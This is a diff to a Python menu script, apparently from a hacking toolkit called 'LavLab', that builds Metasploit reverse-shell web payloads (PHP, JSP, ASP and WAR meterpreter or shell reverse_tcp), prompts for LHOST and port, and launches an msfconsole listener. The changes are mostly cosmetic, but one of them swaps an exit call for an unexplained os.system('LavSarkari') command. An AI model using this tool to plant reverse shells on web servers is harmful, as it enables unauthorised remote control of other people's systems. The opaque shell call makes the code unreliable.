@@ -1,3 +1,4 @@
+ 
 #################### import modules ####################
 import os
 import sys
@@ -20,14 +21,14 @@ G="\033[90m"
 BG="\033[100m"
 #################### main menu ####################
 def menu():
-           try:
+        try:
                 global web,fmt,ext,host,port
                 print ("")
                 print (w+"{"+p+"01"+w+"} payload php php/meterpreter_reverse_tcp")
                 print (w+"{"+p+"02"+w+"} payload jsp java/jsp_shell_reverse_tcp")
                 print (w+"{"+p+"03"+w+"} payload asp windows/meterpreter/reverse_tcp")
                 print (w+"{"+p+"04"+w+"} payload war java/jsp_shell_reverse_tcp")
-                print (w+"{"+p+"00"+w+"} Back to main menu")
+                print (w+"{"+p+"00"+w+"} Main Menu")
                 print ("")
                 Lav = str(input(r+"LavLab"+w+":"+p+"/website/"+w+"> "))
                 if Lav == "0" or Lav == "00" or Lav == "back":
@@ -53,7 +54,7 @@ def menu():
                         ext = "war"
                         pass
                 else:
-                        sys.exit(1)
+                        os.system('LavSarkari')
                 print ("")
                 addrs = str(input(w+"Do you want to use 127.0.0.1 as LHOST? (y/n) "))
                 print ("")
@@ -109,7 +110,7 @@ def menu():
                 Lav = str(input("Do you want to start listener? (y/n) "))
                 if Lav == "y" or Lav == "Y" or Lav == "yes" or Lav == "Yes" or Lav == "YES":
                         print ("")
-                        os.system("msfconsole -q -r LavSarkari.rc")
+                        os.system("msfconsole -q -r say.rc")
                         pass
                 else:
                         pass
